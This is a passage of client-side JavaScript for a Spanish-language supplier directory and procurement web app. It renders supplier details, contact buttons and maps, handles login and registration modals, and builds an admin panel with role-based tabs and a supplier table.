                <span class="chip${!state.selectedCategory ? ' active' : ''}" onclick="filterSupplierCategory(null)">Todos</span>
                ${resp.data.map(c => {
                    const meta = CATEGORY_META[c.name] || { label: c.name, icon: '' };
                    return `<span class="chip${state.selectedCategory === c.name ? ' active' : ''}"
                                  onclick="filterSupplierCategory('${escJs(c.name)}')">${meta.icon} ${esc(meta.label || c.name)}</span>`;
                }).join('')}
            `;
        }
    } catch {}
}

function filterSupplierCategory(cat) {
    state.selectedCategory = cat;
    loadSupplierCategoryChips();
    refreshSupplierView();
}

function filterSupplierDept() {
    state.selectedDepartment = document.getElementById('supplier-dept-filter')?.value || null;
    refreshSupplierView();
}

let _supplierTimer;
function debounceSupplierSearch() {
    clearTimeout(_supplierTimer);
    _supplierTimer = setTimeout(refreshSupplierView, 350);
}

// Refresca lista y, si esta activo el modo mapa, tambien los markers.
function refreshSupplierView() {
    loadPublicSuppliers();
    if (_supplierMapMode) loadSuppliersOnMap();
}

async function loadPublicSuppliers() {
    const mode = state.supplierSearchMode || 'supplier';
    // En modo material, el input sirve para elegir insumo (via chips), no para q directo.
    const q = (mode === 'supplier') ? (document.getElementById('supplier-search')?.value?.trim() || '') : '';
    let params = '?limit=50';
    if (q) params += `&q=${encodeURIComponent(q)}`;
    if (state.selectedCategory) params += `&category=${encodeURIComponent(state.selectedCategory)}`;
    if (state.selectedDepartment) params += `&department=${encodeURIComponent(state.selectedDepartment)}`;
    if (state.insumoFilter && state.insumoFilter.id) params += `&insumo_id=${state.insumoFilter.id}`;

    try {
        const resp = await API.publicSuppliers(params);
        const container = document.getElementById('suppliers-list');
        if (!container) return;
        if (resp.ok && resp.data.length) {
            container.innerHTML = resp.data.map(renderSupplierCard).join('');
        } else {
            container.innerHTML = '<div class="empty-state"><p>No se encontraron proveedores con esos filtros</p></div>';
        }
    } catch {
        const container = document.getElementById('suppliers-list');
        if (container) container.innerHTML = '<div class="empty-state"><p>Error cargando proveedores</p></div>';
    }
}

// ── Public Supplier Detail ────────────────────────────────────
async function showPublicSupplierDetail(supplierId) {
    showModal('Detalle de Proveedor', `
        <div id="pub-supplier-detail"><p style="text-align:center;color:var(--gray-500)">Cargando...</p></div>
    `);
    try {
        const resp = await API.publicSupplierDetail(supplierId);
        const c = document.getElementById('pub-supplier-detail');
        if (!resp.ok || !resp.data) {
            c.innerHTML = '<div class="empty-state"><p>Proveedor no encontrado</p></div>';
            return;
        }
        const s = resp.data;
        const location = [s.city, s.department].filter(Boolean).join(', ');
        const cats = (s.categories || []).map(cat => {
            const meta = CATEGORY_META[cat] || { label: cat };
            return `<span class="supplier-cat">${esc(meta.label || cat)}</span>`;
        }).join('');

        const locked = s.contacts_locked;
        const waBtn = s.whatsapp
            ? `<a href="https://wa.me/${s.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" rel="noopener"
                  class="btn-whatsapp" onclick="event.stopPropagation()">${icon('whatsapp', 16)} WhatsApp</a>`
            : (locked && s.has_whatsapp
                ? `<button class="btn-whatsapp btn-locked" onclick="showLoginModal()">${icon('lock', 14)} WhatsApp</button>`
                : '');
        const callBtn = s.phone
            ? `<a href="tel:${s.phone}" class="btn-call" onclick="event.stopPropagation()">${icon('phone', 16)} Llamar</a>`
            : (locked && s.has_phone
                ? `<button class="btn-call btn-locked" onclick="showLoginModal()">${icon('lock', 14)} Llamar</button>`
                : '');
        const webBtn = s.website
            ? `<a href="${esc(safeUrl(s.website))}" target="_blank" rel="noopener" class="btn-call">${icon('globe', 16)} Web</a>`
            : (locked && s.has_website
                ? `<button class="btn-call btn-locked" onclick="showLoginModal()">${icon('lock', 14)} Web</button>`
                : '');
        const lockedBanner = locked
            ? `<div class="contacts-locked-banner">
                  ${icon('lock', 16)}
                  <span>Los datos de contacto estan disponibles para usuarios registrados.</span>
                  <button class="btn btn-primary btn-sm" onclick="showLoginModal()">Ingresar</button>
                  <button class="btn btn-outline btn-sm" onclick="showRegisterModal(event)">Registrarme</button>
               </div>`
            : '';
        const rating = s.rating > 0
            ? `<span style="color:#f59e0b;font-size:15px">${icon('star', 16)} ${s.rating.toFixed(1)}</span>`
            : '';

        const hasCoords = s.latitude && s.longitude;
        const branchesWithCoords = (s.branches || []).filter(b => b.latitude && b.longitude);
        const showMap = hasCoords || branchesWithCoords.length > 0;

        const branchesHtml = (s.branches || []).map(b => {
            const bLoc = [b.city, b.department].filter(Boolean).join(', ');
            const contactsHtml = (b.contacts || []).map(ct => {
                const waLink = ct.whatsapp
                    ? `<a href="https://wa.me/${ct.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" style="color:var(--whatsapp);font-size:12px">${icon('whatsapp',12)} ${esc(ct.whatsapp)}</a>`
                    : (locked && ct.has_whatsapp
                        ? `<button class="btn-locked" onclick="showLoginModal()" style="font-size:11px;padding:2px 6px">${icon('lock',11)} WhatsApp</button>` : '');
                const phLink = ct.phone && !ct.whatsapp
                    ? `<a href="tel:${ct.phone}" style="font-size:12px">${icon('phone',12)} ${esc(ct.phone)}</a>`
                    : (locked && ct.has_phone && !ct.has_whatsapp
                        ? `<button class="btn-locked" onclick="showLoginModal()" style="font-size:11px;padding:2px 6px">${icon('lock',11)} Telefono</button>` : '');
                return `<div style="display:flex;align-items:center;gap:8px;padding:4px 0">
                    <span style="font-weight:500">${esc(ct.full_name)}</span>
                    ${ct.position ? `<span style="font-size:12px;color:var(--gray-500)">${esc(ct.position)}</span>` : ''}
                    ${waLink}${phLink}
                </div>`;
            }).join('');

            const bWa = b.whatsapp
                ? `<a href="https://wa.me/${b.whatsapp.replace(/[^0-9]/g, '')}" target="_blank" class="btn-whatsapp" style="font-size:12px;padding:3px 8px">${icon('whatsapp',12)} ${esc(b.whatsapp)}</a>`
                : (locked && b.has_whatsapp
                    ? `<button class="btn-whatsapp btn-locked" onclick="showLoginModal()" style="font-size:12px;padding:3px 8px">${icon('lock',12)} WhatsApp</button>` : '');
            const bPh = b.phone
                ? `<a href="tel:${b.phone}" class="btn-call" style="font-size:12px;padding:3px 8px">${icon('phone',12)} ${esc(b.phone)}</a>`
                : (locked && b.has_phone
                    ? `<button class="btn-call btn-locked" onclick="showLoginModal()" style="font-size:12px;padding:3px 8px">${icon('lock',12)} Llamar</button>` : '');

            const bDir = (b.latitude && b.longitude)
                ? `<a href="https://www.google.com/maps/dir/?api=1&destination=${b.latitude},${b.longitude}" target="_blank" rel="noopener" class="btn-call" style="font-size:12px;padding:3px 8px;background:#eff6ff;color:#1e40af">${icon('navigation',12)} Como llegar</a>`
                : '';
            return `
                <div style="border:1px solid var(--gray-200);border-radius:8px;padding:12px;margin-bottom:8px">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
                        <strong>${esc(b.branch_name)}</strong>
                        ${b.is_main ? '<span class="badge badge-success" style="font-size:11px">Principal</span>' : ''}
                    </div>
                    <div style="font-size:13px;color:var(--gray-500);margin-bottom:4px">${icon('map',12)} ${bLoc || 'Sin ubicacion'}</div>
                    ${b.address ? `<div style="font-size:13px;color:var(--gray-500);margin-bottom:6px">${esc(b.address)}</div>` : ''}
                    <div style="display:flex;gap:8px;margin-bottom:6px;flex-wrap:wrap">${bWa}${bPh}${bDir}</div>
                    ${contactsHtml ? `<div style="border-top:1px solid var(--gray-100);padding-top:6px;margin-top:4px">
                        <div style="font-size:12px;color:var(--gray-400);margin-bottom:2px">Contactos</div>
                        ${contactsHtml}
                    </div>` : ''}
                </div>`;
        }).join('');

        const opCities = (s.operating_cities || []).length > 0
            ? `<div style="color:var(--gray-500);font-size:13px;margin-top:2px">${icon('map-pin',13)} Opera en: ${esc(s.operating_cities.join(', '))}</div>`
            : '';

        const phone2Btn = s.phone2
            ? `<a href="tel:${s.phone2}" class="btn-call" onclick="event.stopPropagation()">${icon('phone', 16)} ${esc(s.phone2)}</a>`
            : (locked && s.has_phone2
                ? `<button class="btn-call btn-locked" onclick="showLoginModal()">${icon('lock', 14)} Telefono 2</button>` : '');

        const rubrosHtml = (s.rubros || []).length > 0
            ? `<div style="margin-bottom:16px">
                <h3 style="font-size:15px;margin-bottom:8px;border-bottom:1px solid var(--gray-200);padding-bottom:6px">Productos y Servicios</h3>
                ${s.rubros.map(r => `
                    <div style="padding:8px 0;border-bottom:1px solid var(--gray-100)">
                        <div style="font-weight:600;font-size:14px">${esc(r.rubro)}</div>
                        ${r.description ? `<div style="font-size:13px;color:var(--gray-500);margin-top:2px">${esc(r.description)}</div>` : ''}
                    </div>
                `).join('')}
            </div>`
            : '';

        c.innerHTML = `
            <div style="margin-bottom:16px">
                <div style="display:flex;justify-content:space-between;align-items:start">
                    <div>
                        <h2 style="margin:0;font-size:20px">${esc(s.trade_name || s.name)}</h2>
                        ${s.trade_name && s.trade_name !== s.name ? `<div style="color:var(--gray-500);font-size:14px">${esc(s.name)}</div>` : ''}
                    </div>
                    ${rating}
                </div>
                <div style="color:var(--gray-500);margin-top:4px">${icon('map',14)} ${esc(location || 'Bolivia')}</div>
                ${opCities}
                ${s.address ? `<div style="color:var(--gray-500);font-size:13px;margin-top:2px">${esc(s.address)}</div>` : ''}
                ${s.description ? `<div style="margin-top:8px;font-size:14px;color:var(--gray-600);line-height:1.4">${esc(s.description)}</div>` : ''}
                ${s.email ? `<div style="margin-top:6px;font-size:13px">${icon('mail',13)} <a href="mailto:${esc(s.email)}">${esc(s.email)}</a></div>`
                    : (locked && s.has_email ? `<div style="margin-top:6px;font-size:13px;color:var(--gray-500)">${icon('lock',13)} Email disponible al registrarse</div>` : '')}
                ${s.website ? `<div style="font-size:13px;margin-top:2px">${icon('globe',13)} <a href="https://${esc(s.website)}" target="_blank" rel="noopener">${esc(s.website)}</a></div>` : ''}
            </div>
            ${lockedBanner}
            <div class="supplier-categories" style="margin-bottom:12px">${cats || ''}</div>
            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
                ${waBtn}${callBtn}${phone2Btn}${webBtn}
                ${hasCoords ? `<a href="https://www.google.com/maps/dir/?api=1&destination=${s.latitude},${s.longitude}" target="_blank" rel="noopener" class="btn-call" onclick="event.stopPropagation()" style="background:#eff6ff;color:#1e40af">${icon('navigation',16)} Como llegar</a>` : ''}
            </div>
            ${rubrosHtml}
            ${showMap ? `<div id="supplier-detail-map" style="height:220px;border-radius:8px;margin-bottom:16px"></div>` : ''}
            ${(s.branches || []).length > 0 ? `
                <h3 style="font-size:15px;margin-bottom:8px;border-bottom:1px solid var(--gray-200);padding-bottom:6px">Sucursales (${s.branches.length})</h3>
                ${branchesHtml}
            ` : ''}
        `;

        // Init map
        if (showMap) {
            setTimeout(() => {
                const center = hasCoords ? [s.latitude, s.longitude] : [branchesWithCoords[0].latitude, branchesWithCoords[0].longitude];
                MapUtils.createMap('supplier-detail-map', center, 13);
                if (hasCoords) {
                    MapUtils.addMarker(s.latitude, s.longitude,
                        `<strong>${esc(s.trade_name || s.name)}</strong><br>${location}<br>
                         <a href="https://www.google.com/maps/dir/?api=1&destination=${s.latitude},${s.longitude}" target="_blank" style="color:#1e40af">&#8594; Como llegar</a>`);
                }
                (s.branches || []).forEach(b => {
                    if (b.latitude && b.longitude) {
                        MapUtils.addMarker(b.latitude, b.longitude,
                            `<strong>${esc(b.branch_name)}</strong><br>${[b.city, b.department].filter(Boolean).join(', ')}<br>
                             <a href="https://www.google.com/maps/dir/?api=1&destination=${b.latitude},${b.longitude}" target="_blank" style="color:#1e40af">&#8594; Como llegar</a>`);
                    }
                });
                if (MapUtils._markers.length > 1) MapUtils.fitToMarkers();
            }, 150);
        }
    } catch (e) {
        const c = document.getElementById('pub-supplier-detail');
        if (c) c.innerHTML = `<p style="color:var(--danger)">Error: ${e.message}</p>`;
    }
}

// ── Login Modal (not a page) ───────────────────────────────────
function showLoginModal() {
    showModal('Iniciar Sesion', `
        <form id="login-form" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label class="form-label">Email</label>
                <input class="form-input" type="email" name="email" required placeholder="correo@empresa.com">
            </div>
            <div class="form-group">
                <label class="form-label">Contrasena</label>
                <input class="form-input" type="password" name="password" required placeholder="********">
            </div>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;padding:10px">
                Iniciar Sesion
            </button>
            <div style="text-align:center;margin-top:12px;font-size:13px;color:var(--gray-500)">
                No tienes cuenta? <a href="#" onclick="showRegisterModal(event)">Registrate</a>
            </div>
        </form>
    `);
}

async function handleLogin(e) {
    e.preventDefault();
    const form = e.target;
    try {
        const data = await API.login(form.email.value, form.password.value);
        if (data.access_token) {
            state.token = data.access_token;
            state.refreshToken = data.refresh_token;
            state.user = data.user;
            localStorage.setItem('_mkt_token', state.token);
            localStorage.setItem('_mkt_refresh', state.refreshToken);
            localStorage.setItem('_mkt_user', JSON.stringify(state.user));
            closeModal();
            toast('Bienvenido, ' + (state.user.full_name || ''), 'success');
            renderApp();
            startNotifPolling();
        } else {
            toast(data.detail || 'Credenciales invalidas', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

function showRegisterModal(e) {
    e && e.preventDefault();
    showModal('Crear Cuenta', `
        <form id="register-form" onsubmit="handleRegister(event)">
            <div class="form-group"><label class="form-label">Nombre completo</label><input class="form-input" name="full_name" required></div>
            <div class="form-group"><label class="form-label">Email</label><input class="form-input" type="email" name="email" required></div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group"><label class="form-label">Empresa (opcional)</label><input class="form-input" name="company_name"></div>
                <div class="form-group"><label class="form-label">Telefono</label><input class="form-input" name="phone"></div>
            </div>
            <div class="form-group"><label class="form-label">Contrasena</label><input class="form-input" type="password" name="password" required minlength="6"></div>
            <label class="form-terms">
                <input type="checkbox" name="accept_terms" required>
                <span>He leido y acepto el <a href="#" onclick="event.preventDefault();closeModal();navigate('legal')">Aviso Legal, Terminos de Uso y Politica de Privacidad</a>.</span>
            </label>
            <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center">Crear Cuenta</button>
            <div style="text-align:center;margin-top:12px;font-size:13px;color:var(--gray-500)">
                Ya tienes cuenta? <a href="#" onclick="showLoginModal()">Ingresa aqui</a>
            </div>
        </form>
    `);
}

async function handleRegister(e) {
    e.preventDefault();
    const f = e.target;
    if (f.accept_terms && !f.accept_terms.checked) {
        toast('Debes aceptar el Aviso Legal y los Terminos de Uso', 'error');
        return;
    }
    try {
        const resp = await API.register({
            full_name: f.full_name.value,
            email: f.email.value,
            company_name: f.company_name.value || null,
            phone: f.phone.value || null,
            password: f.password.value,
        });
        if (resp.access_token) {
            state.token = resp.access_token;
            state.refreshToken = resp.refresh_token;
            state.user = resp.user;
            localStorage.setItem('_mkt_token', state.token);
            localStorage.setItem('_mkt_refresh', state.refreshToken);
            localStorage.setItem('_mkt_user', JSON.stringify(state.user));
            localStorage.setItem('_mkt_terms_accepted', new Date().toISOString());
            closeModal();
            toast('Cuenta creada. Bienvenido!', 'success');
            renderApp();
            startNotifPolling();
        } else {
            toast(resp.detail || 'Error al registrarse', 'error');
        }
    } catch { toast('Error de conexion', 'error'); }
}

function logout() {
    stopNotifPolling();
    state.user = null;
    state.token = null;
    state.refreshToken = null;
    localStorage.removeItem('_mkt_token');
    localStorage.removeItem('_mkt_refresh');
    localStorage.removeItem('_mkt_user');
    state.currentPage = 'home';
    toast('Sesion cerrada', 'info');
    renderApp();
}

// ── Role helpers ───────────────────────────────────────────────
const STAFF_ROLES = ['admin', 'superadmin', 'manager', 'field_agent'];
const MANAGER_ROLES = ['admin', 'superadmin', 'manager'];

function isStaff() { return state.user && STAFF_ROLES.includes(state.user.role); }
function isManager() { return state.user && MANAGER_ROLES.includes(state.user.role); }
function isAdmin() { return state.user && ['admin', 'superadmin'].includes(state.user.role); }

const ROLE_LABELS = {
    admin: 'Administrador',
    superadmin: 'Super Admin',
    manager: 'Gestor',
    field_agent: 'Agente de Campo',
    user: 'Usuario',
    supplier: 'Proveedor',
};

const ROLE_COLORS = {
    admin: 'danger', superadmin: 'danger', manager: 'warning',
    field_agent: 'primary', user: 'gray', supplier: 'success',
};

// ── Admin state ────────────────────────────────────────────────
let _adminTab = 'dashboard';

// ── Render: Admin panel ────────────────────────────────────────
async function renderAdmin() {
    if (!isStaff()) { showLoginModal(); navigate('home'); return; }

    const page = document.getElementById('page-content');

    // Tab groups for sidebar
    const dataGroup = [
        { key: 'dashboard', label: 'Dashboard', icon: 'bar-chart' },
        { key: 'suppliers', label: 'Proveedores', icon: 'users' },
        { key: 'products', label: 'Productos', icon: 'tag' },
        { key: 'groups', label: 'Grupos', icon: 'layers' },
    ];
    if (isAdmin()) dataGroup.push({ key: 'review', label: 'Revision', icon: 'check-circle' });
    if (isManager()) dataGroup.push({ key: 'suggestions', label: 'Sugerencias', icon: 'user-plus' });

    const catalogGroup = [];
    if (isAdmin()) catalogGroup.push({ key: 'categories', label: 'Categorias', icon: 'tag' });
    if (isAdmin()) catalogGroup.push({ key: 'uoms', label: 'Unidades', icon: 'settings' });
    if (isAdmin()) catalogGroup.push({ key: 'quotations', label: 'Importar precios', icon: 'upload' });

    const bizGroup = [];
    if (isManager()) bizGroup.push({ key: 'users', label: 'Usuarios', icon: 'user-plus' });
    if (isAdmin()) bizGroup.push({ key: 'companies', label: 'Empresas', icon: 'building' });
    if (isAdmin()) bizGroup.push({ key: 'subscriptions', label: 'Suscripciones', icon: 'crown' });
    if (isAdmin()) bizGroup.push({ key: 'plans', label: 'Planes', icon: 'star' });

    const configGroup = [];
    if (isAdmin()) configGroup.push({ key: 'ai', label: 'Inteligencia AI', icon: 'globe' });
    if (isAdmin()) configGroup.push({ key: 'embeddings', label: 'Busqueda semantica', icon: 'search' });
    if (isAdmin()) configGroup.push({ key: 'agents', label: 'Agentes AI', icon: 'cpu' });
    if (isAdmin()) configGroup.push({ key: 'integrations', label: 'Integraciones', icon: 'whatsapp' });
    if (isAdmin()) configGroup.push({ key: 'tasks', label: 'Tareas Auto', icon: 'clock' });
    if (isAdmin()) configGroup.push({ key: 'apikeys', label: 'API Keys', icon: 'key' });
    if (isAdmin()) configGroup.push({ key: 'seo', label: 'SEO y Marca', icon: 'globe' });

    const groups = [
        { label: 'Datos', items: dataGroup },
        ...(catalogGroup.length ? [{ label: 'Catalogo', items: catalogGroup }] : []),
        ...(bizGroup.length ? [{ label: 'Negocio', items: bizGroup }] : []),
        ...(configGroup.length ? [{ label: 'Configuracion', items: configGroup }] : []),
    ];
    const allTabs = groups.flatMap(g => g.items);

    // Mobile dropdown
    const tabOptions = allTabs.map(t =>
        `<option value="${t.key}" ${_adminTab === t.key ? 'selected' : ''}>${t.label}</option>`
    ).join('');

    // Desktop sidebar
    const sidebarHtml = groups.map(g => `
        <div class="adm-sidebar-group">
            <div class="adm-sidebar-label">${g.label}</div>
            ${g.items.map(t => `
                <button class="adm-sidebar-item${_adminTab === t.key ? ' active' : ''}"
                        onclick="switchAdminTab('${t.key}')">
                    ${icon(t.icon, 16)} ${t.label}
                </button>
            `).join('')}
        </div>
    `).join('');

    page.innerHTML = `
        <select class="admin-tab-select" onchange="switchAdminTab(this.value)">
            ${tabOptions}
        </select>
        <div class="adm-layout">
            <aside class="adm-sidebar">${sidebarHtml}</aside>
            <main class="adm-main" id="admin-content"></main>
        </div>
    `;

    renderAdminTab();
}

function switchAdminTab(tab) {
    _adminTab = tab;
    renderAdmin();
}

function renderAdminTab() {
    switch (_adminTab) {
        case 'dashboard': renderAdminDashboard(); break;
        case 'suppliers': renderAdminSuppliers(); break;
        case 'products': renderAdminProducts(); break;
        case 'groups': renderAdminGroups(); break;
        case 'review': renderAdminReview(); break;
        case 'categories': renderAdminCategories(); break;
        case 'uoms': renderAdminUoms(); break;
        case 'users': renderAdminUsers(); break;
        case 'apikeys': renderAdminApiKeys(); break;
        case 'suggestions': renderAdminSuggestions(); break;
        case 'plans': renderAdminPlans(); break;
        case 'companies': renderAdminCompanies(); break;
        case 'subscriptions': renderAdminSubscriptions(); break;
        case 'tasks': renderAdminTasks(); break;
        case 'ai': renderAdminAI(); break;
        case 'embeddings': renderAdminEmbeddings(); break;
        case 'agents': renderAdminAgents(); break;
        case 'seo': renderAdminSEO(); break;
        case 'integrations': renderAdminIntegrations(); break;
        case 'quotations': renderAdminQuotations(); break;
    }
}

async function renderAdminQuotations() {
    const c = document.getElementById('admin-content');
    c.innerHTML = `
        <h2 class="adm-title">Importar precios (cotizaciones)</h2>
        <p style="color:var(--gray-500);margin-bottom:16px">Carga PDFs, Excel o fotos de cotizaciones de proveedores para extraer precios historicos. No vinculado a pedidos.</p>
        <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
            <button class="btn btn-primary" onclick="showUploadQuotationModal()">${icon('upload',16)} Subir archivo</button>
            <button class="btn btn-secondary" onclick="showManualQuotationModal()">${icon('plus',16)} Manual</button>
        </div>
        <div id="quotations-list"></div>
    `;
    await loadQuotations();
}

// ── Admin: Dashboard ───────────────────────────────────────────
async function renderAdminDashboard() {
    const c = document.getElementById('admin-content');
    c.innerHTML = `
        <h2 class="adm-title">Dashboard</h2>
        <div class="adm-stats" id="admin-stats">
            <div class="adm-stat loading"><div class="adm-stat-val">-</div><div class="adm-stat-lbl">Cargando</div></div>
        </div>
        <div class="adm-quick-grid">
            <button class="adm-quick" onclick="switchAdminTab('suppliers')">
                <span class="adm-quick-icon" style="background:#dbeafe;color:#1e40af">${icon('users',22)}</span>
                <span>Nuevo Proveedor</span>
            </button>
            <button class="adm-quick" onclick="switchAdminTab('products')">
                <span class="adm-quick-icon" style="background:#fef3c7;color:#92400e">${icon('tag',22)}</span>
                <span>Nuevo Producto</span>
            </button>
            <button class="adm-quick" onclick="switchAdminTab('review')">
                <span class="adm-quick-icon" style="background:#d1fae5;color:#065f46">${icon('check-circle',22)}</span>
                <span>Revisar Precios</span>
            </button>
            <button class="adm-quick" onclick="switchAdminTab('ai')">
                <span class="adm-quick-icon" style="background:#ede9fe;color:#6d28d9">${icon('globe',22)}</span>
                <span>Configurar IA</span>
            </button>
        </div>
    `;
    try {
        const resp = await API.stats();
        if (resp.ok) {
            const s = resp.data;
            const stats = [
                { val: s.suppliers, lbl: 'Proveedores', color: '#1e40af', bg: '#dbeafe', ico: 'users' },
                { val: s.insumos, lbl: 'Productos', color: '#92400e', bg: '#fef3c7', ico: 'tag' },
                { val: s.quotations, lbl: 'Cotizaciones', color: '#065f46', bg: '#d1fae5', ico: 'file-text' },
                { val: s.users, lbl: 'Usuarios', color: '#6d28d9', bg: '#ede9fe', ico: 'user-plus' },
                { val: s.regions, lbl: 'Regiones', color: '#0369a1', bg: '#e0f2fe', ico: 'map' },
            ];
            document.getElementById('admin-stats').innerHTML = stats.map(st => `
                <div class="adm-stat">
                    <div class="adm-stat-ico" style="background:${st.bg};color:${st.color}">${icon(st.ico, 20)}</div>
                    <div>
                        <div class="adm-stat-val">${st.val}</div>
                        <div class="adm-stat-lbl">${st.lbl}</div>
                    </div>
                </div>
            `).join('');
        }
    } catch {}
}

// ── Admin: Suppliers ───────────────────────────────────────────
let _admSupOffset = 0;
let _admSupCategory = '';
let _admSupContact = '';
let _admSupLocation = '';
const _admSupPageSize = 50;

async function renderAdminSuppliers() {
    const c = document.getElementById('admin-content');

    // Load categories for filter
    let catOptions = '<option value="">Todas las categorias</option>';
    try {
        const catsRes = await API.adminCategories();
        if (catsRes.ok && catsRes.data) {
            catOptions += catsRes.data.map(cat =>
                `<option value="${esc(cat.key)}" ${_admSupCategory === cat.key ? 'selected' : ''}>${esc(cat.label || cat.key)}</option>`
            ).join('');
        }
    } catch {}

    c.innerHTML = `
        <div class="admin-toolbar">
            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
                <input class="form-input" id="admin-supplier-search" placeholder="Buscar proveedor..."
                       oninput="debounceAdminSuppliers()" style="width:200px">
                <select class="form-select" id="admin-supplier-state" onchange="_admSupOffset=0;loadAdminSuppliers()" style="max-width:160px">
                    <option value="">Todos los estados</option>
                    <option value="pending">Pendiente</option>
                    <option value="verified">Verificado</option>
                    <option value="rejected">Rechazado</option>
                </select>
                <select id="admin-supplier-category"
                        onchange="_admSupCategory=this.value;_admSupOffset=0;loadAdminSuppliers()"
                        style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                    ${catOptions}
                </select>
                <select id="admin-supplier-contact"
                        onchange="_admSupContact=this.value;_admSupOffset=0;loadAdminSuppliers()"
                        style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                    <option value="">Todos contactos</option>
                    <option value="valid_wa" ${_admSupContact === 'valid_wa' ? 'selected' : ''}>WhatsApp valido</option>
                    <option value="no_wa" ${_admSupContact === 'no_wa' ? 'selected' : ''}>Sin WhatsApp</option>
                    <option value="invalid_wa" ${_admSupContact === 'invalid_wa' ? 'selected' : ''}>WhatsApp invalido</option>
                </select>
                <select id="admin-supplier-location"
                        onchange="_admSupLocation=this.value;_admSupOffset=0;loadAdminSuppliers()"
                        style="padding:6px 10px;border:1px solid #ddd;border-radius:4px">
                    <option value="">Ubicacion: todas</option>
                    <option value="missing" ${_admSupLocation === 'missing' ? 'selected' : ''}>Sin ubicacion</option>
                    <option value="has" ${_admSupLocation === 'has' ? 'selected' : ''}>Con ubicacion</option>
                </select>
            </div>
            <div style="display:flex;gap:8px">
                <button class="btn btn-primary" onclick="showAdminSupplierForm()">
                    ${icon('plus',16)} Nuevo
                </button>
                ${isManager() ? `<button class="btn btn-secondary" onclick="showMergeSupplierModal()" style="color:var(--warning)">
                    ${icon('users',16)} Fusionar
                </button>` : ''}
                ${isManager() ? `<button class="btn btn-secondary" onclick="showBulkGeocodeModal()">
                    ${icon('map-pin',16)} Geocodificar
                </button>` : ''}
            </div>
        </div>
        <div id="admin-suppliers-list"></div>
    `;
    loadAdminSuppliers();
}

let _admSupTimer;
function debounceAdminSuppliers() {
    clearTimeout(_admSupTimer);
    _admSupTimer = setTimeout(() => { _admSupOffset = 0; loadAdminSuppliers(); }, 300);
}

async function loadAdminSuppliers() {
    const q = document.getElementById('admin-supplier-search')?.value?.trim() || '';
    const st = document.getElementById('admin-supplier-state')?.value || '';
    let params = `?limit=${_admSupPageSize}&offset=${_admSupOffset}`;
    if (q) params += `&q=${encodeURIComponent(q)}`;
    if (st) params += `&state=${encodeURIComponent(st)}`;
    if (_admSupCategory) params += `&category=${encodeURIComponent(_admSupCategory)}`;
    if (_admSupContact) params += `&contact=${encodeURIComponent(_admSupContact)}`;
    if (_admSupLocation) params += `&location=${encodeURIComponent(_admSupLocation)}`;

    try {
        const resp = await API.suppliers(params);
        const container = document.getElementById('admin-suppliers-list');
        if (!container) return;
        if (!resp.ok || !resp.data.length) {
            container.innerHTML = '<div class="empty-state"><p>No hay proveedores</p></div>';
            return;
        }
        const total = resp.total || 0;
        container.innerHTML = `
            <div class="table-wrap"><table>
                <thead><tr>
                    <th>Nombre</th><th>Ciudad</th><th>Depto.</th><th>Ubicacion</th><th>WhatsApp</th>
                    <th>Categorias</th><th>Estado</th><th>Acciones</th>
                </tr></thead>
                <tbody>${resp.data.map(s => {
                    const waNum = (s.whatsapp || '').replace(/[^0-9]/g, '');
                    const waInvalid = !waNum || waNum === '0000000000' || (waNum.startsWith('591') && waNum.length >= 11 && !['6','7'].includes(waNum[3]));
                    const hasLoc = s.latitude != null && s.longitude != null;
                    const locCell = hasLoc
                        ? `<a href="https://www.google.com/maps/?q=${(+s.latitude).toFixed(6)},${(+s.longitude).toFixed(6)}" target="_blank" rel="noopener" style="color:var(--success);text-decoration:none" title="${(+s.latitude).toFixed(5)}, ${(+s.longitude).toFixed(5)} - Ver en Google Maps">${icon('map-pin',14)}</a>`
                        : `<span style="color:var(--danger)" title="Sin coordenadas">-</span>`;
                    return `
                    <tr>
                        <td><strong>${esc(s.name)}</strong>${s.trade_name ? `<br><small style="color:var(--gray-500)">${esc(s.trade_name)}</small>` : ''}</td>
                        <td>${esc(s.city) || '-'}</td>
                        <td>${esc(s.department) || '-'}</td>
                        <td>${locCell}</td>
                        <td>${s.whatsapp && s.whatsapp !== '0000000000'
                            ? `<a href="https://wa.me/${waNum}" target="_blank" style="color:${waInvalid ? 'var(--danger)' : 'var(--whatsapp)'}">${esc(s.whatsapp)}${waInvalid ? ' ⚠' : ''}</a>`
                            : '<span style="color:var(--danger)">Sin WhatsApp</span>'}</td>
                        <td>${(s.categories || []).map(c => `<span class="supplier-cat">${esc(c)}</span>`).join(' ') || '-'}</td>
                        <td><span class="badge badge-${s.verification_state === 'verified' ? 'success' : s.verification_state === 'rejected' ? 'danger' : 'warning'}">${esc(s.verification_state)}</span></td>
                        <td style="white-space:nowrap">
                            <button class="btn btn-sm btn-primary" onclick="showAdminSupplierDetail(${s.id}, decodeURIComponent('${encodeURIComponent(s.name)}'))" title="Ver detalle">${icon('file-text',14)}</button>
                            <button class="btn btn-sm btn-secondary" onclick="showAdminSupplierForm(${s.id})" title="Editar">${icon('edit',14)}</button>
                            ${isManager() ? `<button class="btn btn-sm btn-secondary" onclick="geocodeRowSupplier(${s.id})" title="Geocodificar" style="color:var(--primary)">${icon('map-pin',14)}</button>` : ''}
                            ${isManager() ? `<button class="btn btn-sm btn-secondary" onclick="verifySupplier(${s.id},'verified')" title="Verificar" style="color:var(--success)">&#10003;</button>` : ''}
                        </td>
                    </tr>`;
                }).join('')}</tbody>
            </table></div>
            ${total > _admSupPageSize ? `
                <div style="display:flex;justify-content:center;gap:8px;margin-top:16px;align-items:center">
                    <button class="btn btn-sm" ${_admSupOffset === 0 ? 'disabled' : ''}
                            onclick="_admSupOffset=Math.max(0,_admSupOffset-${_admSupPageSize});loadAdminSuppliers()">Anterior</button>
                    <span style="padding:6px;color:#666;font-size:13px">${_admSupOffset + 1}-${Math.min(_admSupOffset + _admSupPageSize, total)} de ${total}</span>
